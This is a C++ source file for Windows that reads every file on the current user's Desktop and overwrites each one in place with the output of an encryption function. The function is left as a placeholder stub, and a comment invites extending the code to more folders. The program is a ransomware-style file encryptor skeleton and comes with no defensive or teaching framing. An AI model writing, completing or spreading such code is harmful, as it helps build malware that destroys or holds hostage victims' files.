#include <iostream>
#include <fstream>
#include <string>
#include <windows.h>

using namespace std;

string encrypt(string data) {
    // Your encryption algorithm goes here
    return data;
}

void encryptFiles(string folderPath) {
    string searchPath = folderPath + "\\*.*";
    WIN32_FIND_DATA fileData;
    HANDLE hFind = FindFirstFile(searchPath.c_str(), &fileData);
    if (hFind != INVALID_HANDLE_VALUE) {
        do {
            if (!(fileData.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY)) {
                string filePath = folderPath + "\\" + fileData.cFileName;
                ifstream inFile(filePath.c_str(), ios::binary);
                if (inFile) {
                    string fileContent((istreambuf_iterator<char>(inFile)), istreambuf_iterator<char>());
                    inFile.close();
                    string encryptedContent = encrypt(fileContent);
                    ofstream outFile(filePath.c_str(), ios::binary);
                    outFile.write(encryptedContent.c_str(), encryptedContent.size());
                    outFile.close();
                }
            }
        } while (FindNextFile(hFind, &fileData));
        FindClose(hFind);
    }
}

int main() {
    string desktopPath = getenv("USERPROFILE");
    desktopPath += "\\Desktop";
    encryptFiles(desktopPath);
    // Add more folders to encrypt here
    return 0;
}

